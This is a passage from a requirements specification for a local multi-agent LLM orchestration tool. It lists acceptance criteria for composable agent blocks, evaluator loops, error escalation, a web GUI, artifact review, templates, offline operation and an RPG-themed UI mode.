  - verify: PORT_TYPES contains all 6 expected type tags
- AC-04.30.2: A port type can have an associated JSON schema
  - verify: register_port_type with json_schema -> PORT_TYPE_REGISTRY entry has the schema
- AC-04.30.3: Built-in PORT_TYPES includes "files" type tag (used by coder block context port)
  - verify: PORT_TYPES set -> contains "files" in addition to plan, code-changes, review, test-results, text, any
- AC-04.30.4: Port with no schema accepts any JSON-serializable data
  - verify: register_port_type("custom-type") with no json_schema -> validate_port_data with any dict returns (True, "")

**REQ-04.31 — Port compatibility checked at composition time**

- AC-04.31.1: Same type tags are compatible
  - verify: check_port_compatibility("plan", "plan") -> True
- AC-04.31.2: Different types are incompatible
  - verify: check_port_compatibility("plan", "code-changes") -> False
- AC-04.31.3: validate_team reports port type mismatches
  - verify: validate_team with mismatched port connection -> errors contain "mismatch"

**REQ-04.32 — 'any' type is the escape hatch**

- AC-04.32.1: Source 'any' matches any target
  - verify: check_port_compatibility("any", "plan") and ("any", "code-changes") -> both True
- AC-04.32.2: Target 'any' accepts any source
  - verify: check_port_compatibility("plan", "any") and ("review", "any") -> both True
- AC-04.32.3: 'any' to 'any' is compatible
  - verify: check_port_compatibility("any", "any") -> True

**REQ-04.33 — Composite blocks expose unconnected inner ports**

- AC-04.33.1: Unconnected inputs/outputs become composite ports
  - verify: get_composite_ports on a team -> exposed inputs include unconnected input, exposed outputs include unconnected output
- AC-04.33.2: Connected ports are not exposed
  - verify: get_composite_ports on a team -> internally wired ports do not appear in exposed lists

**REQ-04.34 — New type tags can be registered by users**

- AC-04.34.1: Custom type tags are added to the global registry
  - verify: register_port_type("my-custom-type") -> PORT_TYPES contains it and self-compatibility holds
- AC-04.34.2: Custom types can include JSON schema for validation
  - verify: register_port_type with json_schema -> validate_port_data with matching data returns valid
- AC-04.34.3: Data failing schema check is rejected
  - verify: validate_port_data with missing required field -> returns invalid with type name in error

**REQ-04.35 — Port data is always serializable (JSON)**

- AC-04.35.1: Standard dicts/lists/strings pass validation
  - verify: validate_port_data with a dict -> valid is True
- AC-04.35.2: Non-JSON-serializable data is rejected
  - verify: validate_port_data with a set -> valid is False with "json-serializable" in error
- AC-04.35.3: Unknown type tags still require JSON serializability
  - verify: validate_port_data with unknown type and valid JSON -> valid is True

**REQ-04.40 — Standard evaluator output**

- AC-04.40.1: All evaluator blocks return `{pass, score, feedback, details}`
  - verify: Run the evaluator block -> output is a dict with `pass` (bool), `score` (0-100), `feedback` (string), `details` (dict)
- AC-04.40.2: Evaluator output missing a required field raises a validation error
  - verify: Evaluator returns `{pass: true}` without `score` -> `EvaluatorOutputError` is raised
- AC-04.40.3: Non-JSON evaluator output falls back to keyword heuristic parsing
  - verify: TeamRunner._parse_evaluator_result with plain text containing "pass" -> returns EvaluatorResult with passed=True

**REQ-04.41 — Each evaluator defines its own rubric/criteria**

- AC-04.41.1: Evaluator block has a system_prompt containing the rubric
  - verify: Built-in evaluator block -> system_prompt is non-empty
- AC-04.41.2: Custom evaluator blocks can have any criteria in system_prompt
  - verify: Create a BlockDef with role "evaluator" and custom system_prompt -> system_prompt contains the custom criteria

**REQ-04.42 — Loop exit checks pass**

- AC-04.42.1: Loop continues when evaluator returns `pass: false`
  - verify: Evaluator returns `{pass: false, score: 40, feedback: "needs work"}` -> loop sends feedback to generator and runs another iteration
- AC-04.42.2: Loop exits when evaluator returns `pass: true`
  - verify: Evaluator returns `{pass: true, score: 90, feedback: "looks good"}` -> loop exits and returns the final artifact

**REQ-04.43 — Max iteration safety limit per loop**

- AC-04.43.1: Loop stops after the configured max iterations even if evaluator never passes
  - verify: Set `max_iterations = 3` and evaluator always returns `pass: false` -> loop exits after 3 iterations with status "max iterations reached"
- AC-04.43.2: Default max iteration limit is 5
  - verify: Create a loop block with no explicit max_iterations config -> it stops after 5 iterations if evaluator never passes
- AC-04.43.3: Validation rejects max_iterations less than 1
  - verify: validate_team with LoopDef(max_iterations=0) -> errors contain "max_iterations"

**REQ-04.44 — Evaluator criteria are part of the block config**

- AC-04.44.1: TeamRunner injects evaluator system_prompt as criteria into evaluator input
  - verify: _build_evaluator_input for a custom evaluator -> output contains the evaluator's system_prompt criteria

**REQ-04.50 — Block fails then retry N times**

- AC-04.50.1: A failing block is retried up to the configured limit
  - verify: Set `retry_count = 2` for a block that fails on first call -> block is retried twice (3 total attempts) before escalating
- AC-04.50.2: Default retry count is 1
  - verify: Block fails with no explicit retry config -> retried once (2 total attempts), then escalates
- AC-04.50.3: max_retries=0 means no retries; immediate failure
  - verify: Block with max_retries=0 fails -> generate called exactly once, then EscalationError
- AC-04.50.4: Higher retry counts allow more total attempts
  - verify: Block with max_retries=3 fails 3 times then succeeds -> 4 total generate calls, returns success

**REQ-04.51 — Still failing: escalate to caller**

- AC-04.51.1: BlockError is raised when all retries are exhausted
  - verify: Block with max_retries=1 always fails -> EscalationError raised matching block name
- AC-04.51.2: Escalation error includes block instance name and failure details
  - verify: Block "analyzer" fails with "OOM" -> EscalationError message contains both "analyzer" and "OOM"

**REQ-04.52 — Caller decides: retry differently, skip, substitute, or escalate**

- AC-04.52.1: Caller pre-sets 'skip' decision; failed block is skipped
  - verify: set_caller_decision("w", DECISION_SKIP) -> failed block returns "SKIPPED" instead of raising
- AC-04.52.2: Caller pre-sets 'escalate' decision; EscalationError raised
  - verify: set_caller_decision("critical", DECISION_ESCALATE) -> EscalationError raised on failure
- AC-04.52.3: Default decision without explicit setting is escalate
  - verify: No caller decision set -> block failure raises EscalationError

**REQ-04.53 — Error reaches entry agent with no resolution: escalate to human**

- AC-04.53.1: EscalationError propagates up to the caller (human)
  - verify: Entry block fails with max_retries=0 -> EscalationError with "human intervention" message
- AC-04.53.2: EscalationError message includes block instance name and original error
  - verify: Block "fatal" fails with "disk full" -> EscalationError contains both "fatal" and "disk full"

**REQ-04.54 — Partial failure in parallel branches: other branches continue**

- AC-04.54.1: One branch failing does not stop other parallel branches
  - verify: Run 3 parallel branches; branch 2 fails -> branches 1 and 3 complete successfully; overall result reports branch 2 failure
- AC-04.54.2: Partial failure is reported in the aggregate result
  - verify: 1 of 3 branches fails -> composite result includes "1 of 3 branches failed" with details of the failed branch

#### 4B: Composable Agent Blocks

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.20 | **Atomic blocks** — single-agent building blocks with defined inputs/outputs/role | e.g., "coder", "reviewer", "planner" |
| REQ-04.21 | **Composite blocks** — groups of connected blocks saved as a single reusable unit | e.g., "verified-coder" = coder + evaluator |
| REQ-04.22 | **Block connectors** — defined input/output ports | Output of "coder" feeds into "reviewer" |
| REQ-04.23 | **Block library** — local catalog of available blocks | Built-in + user-created |
| REQ-04.24 | **CLI team composer** — text-based composition via config files | TOML graph description |
| REQ-04.25 | **Nesting** — composite blocks can contain other composite blocks | "dev-loop" inside "full-project" |
| REQ-04.26 | **Block versioning** — blocks are versioned; references pin a version | Default: pinned at composition time |
| REQ-04.27 | **Loop/cycle support in block graphs** | "coder → reviewer → coder" is valid; exit condition defined by evaluator |

#### 4B-i: Block Port Type System

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.30 | Every port has a **type tag** and optional **JSON schema** | Type tags: `plan`, `code-changes`, `review`, `test-results`, `text`, `any` |
| REQ-04.31 | Port compatibility checked at composition time | CLI: validation rejects with clear error |
| REQ-04.32 | `any` type is the escape hatch | For flexible blocks |
| REQ-04.33 | Composite blocks expose unconnected inner ports as their own ports | External interface derived from internal wiring |
| REQ-04.34 | New type tags can be registered by users | Extensible |
| REQ-04.35 | Port data is always serializable (JSON) | Enables persistence, logging, replay |

#### 4B-ii: Evaluator Contract & Exit Conditions

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.40 | **Standard evaluator output**: `{pass: bool, score: 0-100, feedback: string, details: {...}}` | All evaluators produce this shape |
| REQ-04.41 | **Each evaluator defines its own rubric/criteria** | Configurable per-instance |
| REQ-04.42 | **Loop exit checks `pass`** — loop continues until evaluator says `pass: true` | Score and feedback flow back to generator |
| REQ-04.43 | **Max iteration safety limit** per loop — configurable, default 5 | Prevents infinite loops |
| REQ-04.44 | **Evaluator criteria are part of the block config** — editable per-instance | Same type, different criteria |

#### 4B-iii: Error Propagation in Block Graphs

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.50 | **Block fails → retry N times** (configurable, default 1) | Transient failures handled locally |
| REQ-04.51 | **Still failing → escalate to caller** | Error includes what failed, what was tried |
| REQ-04.52 | **Caller decides**: retry differently, skip, substitute, or escalate further | Caller has autonomy |
| REQ-04.53 | **Error reaches entry agent with no resolution → escalate to human** | Last resort |
| REQ-04.54 | **Partial failure in parallel branches** — other branches continue | Don't kill the whole team |

#### 4C: Built-in Atomic Blocks

| Block | Role | Input Ports (type) | Output Ports (type) |
|-------|------|--------------------|---------------------|
| **planner** | Decomposes task into structured plan | `task: text` | `plan: plan` |
| **coder** | Writes code to spec | `spec: plan`, `context: files` | `changes: code-changes` |
| **reviewer** | Reviews code for correctness, style | `changes: code-changes`, `spec: plan` | `result: review` |
| **tester** | Writes and runs tests | `changes: code-changes`, `spec: plan` | `result: test-results` |
| **evaluator** | Judges quality against criteria | `artifact: any`, `criteria: text` | `result: review` |
| **researcher** | Reads docs, searches code | `question: text` | `report: text` |
| **writer** | Produces documentation | `topic: text`, `context: any` | `doc: document` |
| **learner** | Extracts lessons from completed work | `logs: any`, `outcomes: any` | `insights: learnings` |

#### 4D: Built-in Composite Blocks

| Composite Block | Composition | Loop? | Description |
|-----------------|-------------|-------|-------------|
| **verified-coder** | coder → evaluator | Yes | Code with built-in quality gate |
| **dev-loop** | planner → coder → tester → reviewer | Yes | Standard development cycle |
| **research-and-implement** | researcher → planner → verified-coder | No | Investigate first, then build |
| **dev-loop-with-learning** | dev-loop → learner | No | Dev cycle that captures lessons |


---

## P3 — GUI & Polish

### REQ-05 (extended): Web GUI

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-05.4 | CLI exposes a local REST API that a GUI consumes | GUI is purely a frontend |
| REQ-05.5 | **GUI** — web-based (localhost) real-time monitoring and interaction | Dashboard: agent status, tasks, output |
| REQ-05.6 | **Visual team composer** — drag-and-drop block editor | Node-based editor; equivalent to TOML configs |
| REQ-05.7 | GUI shows agent communication graph / message flow | Visual who's-talking-to-whom |

#### Acceptance Criteria (REQ-05.4)

**REQ-05.4 — CLI exposes a local REST API that a GUI consumes**

- AC-05.4.1: GET /api/status returns project status
  - verify: Create app with guild_dir, GET /api/status -> 200 with status "ok"
- AC-05.4.2: POST /api/tasks creates a task and GET /api/tasks lists tasks
  - verify: POST /api/tasks with description -> 200; GET /api/tasks -> list contains at least 1 task

#### Acceptance Criteria (REQ-05.5 through REQ-05.7)

**REQ-05.5 — GUI: web-based localhost real-time monitoring and interaction**

- AC-05.5.1: `guild serve` starts a web server on localhost serving the dashboard
  - verify: Run `guild serve` -> HTTP server starts on localhost; GET / returns the dashboard HTML page
- AC-05.5.2: Dashboard displays a task list with current status
  - verify: Create 2 tasks, load the dashboard -> task list shows both tasks with their status (running, done, etc.)
- AC-05.5.3: Real-time updates arrive via WebSocket
  - verify: Connect a WebSocket client to /ws -> status updates are pushed to the client within 2 seconds of a state change

**REQ-05.6 — Visual team composer: drag-and-drop block editor**

- AC-05.6.1: Blocks are draggable onto a canvas
  - verify: Open the team composer page -> drag a "coder" block from the library onto the canvas -> block appears at the drop position
- AC-05.6.2: Connections can be drawn between block ports
  - verify: Place coder and reviewer blocks on canvas -> drag from coder's output port to reviewer's input port -> connection line appears
- AC-05.6.3: Saving the composition produces a valid TOML team file
  - verify: Compose a team of planner->coder->reviewer, click Save -> .guild/teams/<name>.toml is created and passes validate_team

**REQ-05.7 — GUI shows agent communication graph / message flow**

- AC-05.7.1: The messages page renders an interactive graph canvas showing agent nodes and communication edges
  - verify: Navigate to `/messages` in the GUI -> a flow canvas is visible with controls and minimap
- AC-05.7.2: Agent nodes appear dynamically as agents communicate
  - verify: Two agents exchange a message -> both agents appear as nodes on the graph within 2 seconds
- AC-05.7.3: Edges between agents show message count and animate on new messages
  - verify: Agent A sends 3 messages to Agent B -> edge label shows "3 msgs" and animates briefly on each new message
- AC-05.7.4: Clicking an edge displays message details in a side panel
  - verify: Click the edge between Agent A and Agent B -> a side panel opens showing the messages exchanged between them with timestamps and content
- AC-05.7.5: The graph displays a placeholder when no agents are communicating
  - verify: Load the messages page with no active agents -> a "Waiting for agent messages..." placeholder is displayed

### REQ-18: Artifact Management

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-18.1 | Artifact collection — gather all outputs per task | Per-task artifact directory |
| REQ-18.2 | Diff view of codebase changes made by agents | Git-style diffs |
| REQ-18.3 | Accept/reject/edit agent outputs before committing | Review gate |
| REQ-18.4 | Artifact versioning — track iterations | "Draft 1, Draft 2, Final" |
| REQ-18.5 | Artifact export | Zip, git bundle, etc. |

#### Acceptance Criteria (REQ-18.1 through REQ-18.5)

**REQ-18.1 — Artifact collection -- gather all outputs per task**

- AC-18.1.1: All files created or modified by a task are collected in a per-task artifact directory
  - verify: Agent creates 2 new files during a task -> `.guild/artifacts/<task_id>/` contains both files
- AC-18.1.2: Artifact directory is created automatically when the first output is produced
  - verify: Run a task that generates output -> `.guild/artifacts/<task_id>/` directory exists without manual creation
- AC-18.1.3: Tasks that produce no artifacts have an empty artifact record
  - verify: Run a task that only reads files -> `guild artifacts <task_id>` shows "No artifacts produced"
- AC-18.1.4: Files modified (not just created) by the agent's file_write tool are captured as artifacts
  - verify: Agent modifies an existing file via file_write -> the modified file is collected in `.guild/artifacts/<task_id>/` with the new content

**REQ-18.2 — Diff view of codebase changes made by agents**

- AC-18.2.1: Git-style diffs are available for all files modified by a task
  - verify: Agent modifies `src/main.py` -> `guild diff <task_id>` shows a unified diff of the changes to that file
- AC-18.2.2: Diffs include additions, deletions, and modifications
  - verify: Agent adds a file, deletes a file, and modifies a file -> `guild diff <task_id>` shows all three change types with correct diff markers

**REQ-18.3 — Accept/reject/edit agent outputs before committing**

- AC-18.3.1: Agent outputs can be accepted to apply them to the working tree
  - verify: Run `guild accept <task_id>` -> all artifact changes are applied to the project working directory
- AC-18.3.2: Agent outputs can be rejected to discard them
  - verify: Run `guild reject <task_id>` -> artifact changes are not applied; working directory remains unchanged
- AC-18.3.3: Partial acceptance is supported (accept some files, reject others)
  - verify: Run `guild accept <task_id> --file src/main.py` -> only `src/main.py` changes are applied; other file changes remain pending
- AC-18.3.4: Accepting an artifact applies its content to the project working tree (not just changes status)
  - verify: Run `guild accept <task_id>` -> artifact file content is written to the project working directory at the correct path

**REQ-18.4 — Artifact versioning -- track iterations**

- AC-18.4.1: Each iteration of a task produces a new artifact version
  - verify: Agent revises code after review feedback -> `guild artifacts <task_id>` shows "v1" and "v2" with timestamps
- AC-18.4.2: Previous versions are preserved and accessible
  - verify: Run `guild artifacts <task_id> --version 1` -> displays the first iteration, not the latest

**REQ-18.5 — Artifact export**

- AC-18.5.1: Artifacts can be exported as a zip file
  - verify: Run `guild export <task_id> --format zip` -> produces a `.zip` file containing all artifact files for that task
- AC-18.5.2: Artifacts can be exported as a git bundle
  - verify: Run `guild export <task_id> --format git-bundle` -> produces a `.bundle` file that can be cloned with `git clone`
- AC-18.5.3: Export of a task with no artifacts produces a clear message
  - verify: Run `guild export <task_id>` on a task with no artifacts -> error: "No artifacts to export for task <task_id>"

### REQ-19: Session & Workflow Templates

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-19.1 | Save a workflow as a reusable template | "Do code review like last time" |
| REQ-19.2 | Parameterized templates | Template variables |
| REQ-19.3 | Import/export/share templates | File-based, versionable |


#### Acceptance Criteria (REQ-19.1 through REQ-19.3)

**REQ-19.1 — Save a workflow as a reusable template**

- AC-19.1.1: A completed workflow can be saved as a named template
  - verify: Run `guild template save <task_id> --name "code-review"` -> template stored in `.guild/templates/code-review.toml`
- AC-19.1.2: A saved template can be used to launch a new task
  - verify: Run `guild task --template code-review` -> new task launches with the same agent config, tools, and workflow steps as the original
- AC-19.1.3: Saving a template from a non-existent task produces a clear error
  - verify: Run `guild template save nonexistent-id --name "test"` -> error: "No task found with ID nonexistent-id"

**REQ-19.2 — Parameterized templates**

- AC-19.2.1: Templates support variable placeholders
  - verify: Create a template with `description = "Review PR {{pr_number}}"` -> `guild task --template code-review --var pr_number=42` produces a task with description "Review PR 42"
- AC-19.2.2: Missing required variables produce a clear error
  - verify: Template requires `{{repo}}` but `guild task --template code-review` is run without `--var repo=...` -> error: "Template requires variable: repo"
- AC-19.2.3: Unused variables are ignored without error
  - verify: Run `guild task --template code-review --var pr_number=42 --var extra=hello` -> task launches successfully; extra variable is silently ignored

**REQ-19.3 — Import/export/share templates**

- AC-19.3.1: Templates can be exported to a standalone file
  - verify: Run `guild template export code-review --output review.toml` -> produces a self-contained TOML file
- AC-19.3.2: Templates can be imported from a file
  - verify: Run `guild template import review.toml` -> template becomes available in `guild template list`
- AC-19.3.3: Importing a template with the same name as an existing one requires confirmation
  - verify: Import a template named "code-review" when one already exists -> prompt: "Template code-review already exists. Overwrite? [y/N]"

### REQ-21: Offline-First Design

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-21.1 | Core functionality works with zero internet | Ollama + local tools = fully functional |
| REQ-21.2 | Cloud features degrade gracefully | Clear error, automatic fallback to local |
| REQ-21.3 | Local model management from Guild | `guild models list`, `guild models pull` |
| REQ-21.4 | Offline documentation | `guild help <topic>` |

#### Acceptance Criteria (REQ-21.1 through REQ-21.4)

**REQ-21.1 — Core functionality works with zero internet**

- AC-21.1.1: Agent runs a full task with no internet connectivity
  - verify: Disconnect network, start Ollama with a local model, run `guild task "list files"` -> task completes successfully using local model and local tools
- AC-21.1.2: No startup error when internet is unavailable
  - verify: Disconnect network, run `guild status` -> CLI responds normally with no connection-related errors

**REQ-21.2 — Cloud features degrade gracefully**

- AC-21.2.1: Cloud provider failure falls back to local provider
  - verify: Configure a cloud provider as primary with Ollama as fallback, disconnect internet -> agent logs "Cloud provider unreachable, falling back to local" and continues with Ollama
- AC-21.2.2: Fallback produces a clear log message, not a silent switch
  - verify: Trigger cloud fallback -> log contains explicit message identifying which provider failed and which fallback was activated
- AC-21.2.3: Features that require internet report unavailability without crashing
  - verify: Attempt a webhook notification with no internet -> log contains "Webhook delivery failed: network unreachable"; agent continues normally

**REQ-21.3 — Local model management from Guild**

- AC-21.3.1: `guild models list` shows locally available models
  - verify: Pull a model via Ollama, run `guild models list` -> output includes the model name, size, and quantization level
- AC-21.3.2: `guild models pull <name>` downloads a model via Ollama
  - verify: Run `guild models pull gemma4:4b` -> model downloads and subsequently appears in `guild models list`
- AC-21.3.3: Pulling a model that does not exist produces a clear error
  - verify: Run `guild models pull nonexistent-model-xyz` -> error message "Model 'nonexistent-model-xyz' not found in Ollama registry"

**REQ-21.4 — Offline documentation**

- AC-21.4.1: `guild help <topic>` displays documentation without internet
  - verify: Disconnect network, run `guild help permissions` -> help text for the permissions system is displayed
- AC-21.4.2: Requesting help for an unknown topic returns a suggestion
  - verify: Run `guild help foobar` -> output includes "Unknown topic 'foobar'. Available topics:" followed by a list

### REQ-22: RPG Fun Mode (UI Theme)

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-22.1 | **UI mode toggle**: "serious" (default) and "RPG" mode | `guild config set ui.mode rpg` |
| REQ-22.2 | RPG mode renames concepts in the UI only | Tasks → Quests, Teams → Parties, etc. |
| REQ-22.3 | RPG-style progress indicators | XP bars, "Level Up!" |
| REQ-22.4 | Quest log view for task history | RPG-style quest tracker |
| REQ-22.5 | Agent "character sheets" | Model, tools, stats |
| REQ-22.6 | Fun notifications | "A new quest has arrived!" |

#### Acceptance Criteria (REQ-22.1 through REQ-22.6)

**REQ-22.1 — UI mode toggle: "serious" (default) and "RPG" mode**

- AC-22.1.1: Default UI mode is "serious"
  - verify: Fresh install, run any CLI command -> output uses standard terminology (tasks, agents, teams)
- AC-22.1.2: RPG mode is activated via config
  - verify: Run `guild config set ui.mode rpg` -> subsequent CLI output uses RPG terminology (quests, adventurers, parties)
- AC-22.1.3: Switching back to "serious" restores standard terminology
  - verify: Set `ui.mode = "rpg"`, then set `ui.mode = "serious"` -> output reverts to standard terms

**REQ-22.2 — RPG mode renames concepts in the UI only**

- AC-22.2.1: Renaming is display-only; internal data structures remain unchanged
  - verify: In RPG mode, create a task -> SQLite stores it in the `tasks` table (not "quests"); `guild ps` displays it as a "Quest"
- AC-22.2.2: Config files and API responses use canonical names regardless of mode
  - verify: In RPG mode, export task data as JSON -> keys are `task_id`, `status`, not RPG equivalents

**REQ-22.3 — RPG-style progress indicators**

- AC-22.3.1: Task progress renders as an XP bar in RPG mode
  - verify: Run a task in RPG mode that has 5 subtasks -> `guild status` shows an XP-style progress bar (e.g., "XP: [====------] 2/5")
- AC-22.3.2: Standard progress rendering in serious mode is unaffected
  - verify: Same task in serious mode -> `guild status` shows a plain progress indicator without RPG theming
- AC-22.3.3: "Level Up!" notification fires when a task milestone is reached
  - verify: Agent completes a milestone (e.g., first subtask done) in RPG mode -> a "Level Up!" styled notification is generated

**REQ-22.4 — Quest log view for task history**

- AC-22.4.1: `guild history` in RPG mode displays as a quest log
  - verify: Complete 3 tasks in RPG mode, run `guild history` -> output is styled as "Quest Log" with RPG-style status labels (e.g., "Completed", "Failed")
- AC-22.4.2: Quest log contains the same data as standard history
  - verify: Compare `guild history` output in serious mode vs RPG mode -> same tasks, same details, different styling

**REQ-22.5 — Agent "character sheets"**

- AC-22.5.1: `guild status --agent <name>` in RPG mode displays a character sheet
  - verify: In RPG mode, run `guild status --agent coder` -> output includes model as "Class", tools as "Abilities", token usage as "Stats"
- AC-22.5.2: Character sheet includes tools as "Abilities" and token usage as "Stats"
  - verify: In RPG mode, agent has 3 tools and 500 tokens used -> character sheet shows "Abilities: file_read, file_write, shell" and "Stats: 500 XP spent"

**REQ-22.6 — Fun notifications**

- AC-22.6.1: Notifications use RPG-themed language in RPG mode
  - verify: In RPG mode, receive a task completion notification -> message reads something like "Quest Complete! Your party has triumphed!" instead of "Task completed"
- AC-22.6.2: Notifications use standard language in serious mode
  - verify: In serious mode, receive a task completion notification -> message reads "Task <task_id> completed"
- AC-22.6.3: Serious-mode notification method returns standard phrasing that differs from RPG phrasing
  - verify: In serious mode, `notification("task_completed")` returns "Task completed" (not "Quest complete! Glory awaits!")

### REQ-04.24 (extended): Visual Team Composer in GUI

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-04.24a | Drag-and-drop blocks, connect them, save as team config | Node-RED / Unreal Blueprints style |

#### Acceptance Criteria (REQ-04.24a)

**REQ-04.24a — Visual Team Composer: drag-and-drop blocks, connect them, save as team config**

- AC-04.24a.1: Visual composer saves team configuration via POST /api/teams
  - verify: POST /api/teams with name, blocks, and connections -> returns 200 with status "ok"; team TOML file is written to .guild/teams/<name>.toml
- AC-04.24a.2: Saved team composition is loadable by the CLI team runner
  - verify: Save a team via the GUI API -> `guild task --team <name>` loads the team and validates it without errors
- AC-04.24a.3: POST /api/teams with missing name returns 400 error
  - verify: POST /api/teams with empty name -> returns 400 with detail "Team name is required"

---

## Cross-Cutting Concerns

These apply across all requirements:

| Concern | Requirement |
|---------|-------------|
| **Logging** | All components use structured logging with consistent format |
| **Error handling** | All errors are caught, logged, and surfaced clearly — no silent failures |
| **Testing** | All components have unit tests; integration tests with mocked LLM; session recording/replay for regression |
| **Documentation** | All public APIs, config formats, and tool interfaces are documented |
| **Performance** | Response latency targets: CLI commands < 200ms, agent message relay < 100ms |
| **Backwards compatibility** | Config format changes are versioned; old configs produce migration instructions |

### Unified Storage Architecture

**Single source of truth: SQLite database** with files on disk for large artifacts.

| Data | Storage | Notes |
|------|---------|-------|
| Agent state & context | SQLite | Conversation history, current state, checkpoints |
| Memory & learnings | SQLite | Index, confidence scores, categories, decay timestamps |
| Audit logs | SQLite | Tool calls, permission decisions, agent actions |
| Task history | SQLite | Definitions, status, outcomes |
| Daemon state | SQLite + PID files | PID, socket path, status, queue position |
| Block definitions | SQLite + files | Metadata in DB, config files on disk |
| Team compositions | SQLite + files | Metadata in DB, config files on disk |
| Artifacts (code, docs) | Files on disk, tracked in SQLite | DB stores path, hash, metadata |
| Session traces | SQLite | Full reasoning chains for replay |
| Config | Files on disk | TOML, read on startup, hot-reloaded |

---

## Glossary

| Term | Definition |
|------|------------|
| **Guild** | The core runtime that manages agents, tools, permissions, and communication |
| **Agent** | An LLM-powered entity with a role, tools, and permissions |
| **Entry Agent** | The user-facing agent — first point of contact; can delegate |
| **Orchestrator** | An agent role that decomposes tasks and delegates to workers |
| **Worker** | An agent that executes specific subtasks |
| **Block (Atomic)** | A single-agent building block with defined inputs, outputs, and role |
| **Block (Composite)** | A group of connected blocks saved as a reusable unit |
| **Block Library** | The catalog of available blocks (built-in + user-created) |
| **Connector** | Input/output port definition for block wiring |
| **Tool** | A capability an agent can invoke (file read, shell exec, etc.) |
| **MCP** | Model Context Protocol — standard for agent-to-tool communication |
| **A2A** | Agent-to-Agent Protocol — optional for cross-Guild communication |
| **Message Bus** | Internal agent-to-agent communication — send/receive, no network overhead |
| **Skill** | A pluggable capability definition |
| **Team** | A configured graph of connected blocks working together |
| **Session** | A single run of a task, from start to completion |
| **Checkpoint** | A saved snapshot of agent/task state for resume |
| **Profile** | A named configuration (permission, team, etc.) |
| **Learning** | An extracted insight stored with confidence score |
| **Daemon** | The background process that runs the agent loop when detached from the terminal |
| **Good Neighbor** | Resource-aware scheduling that yields to user activity |
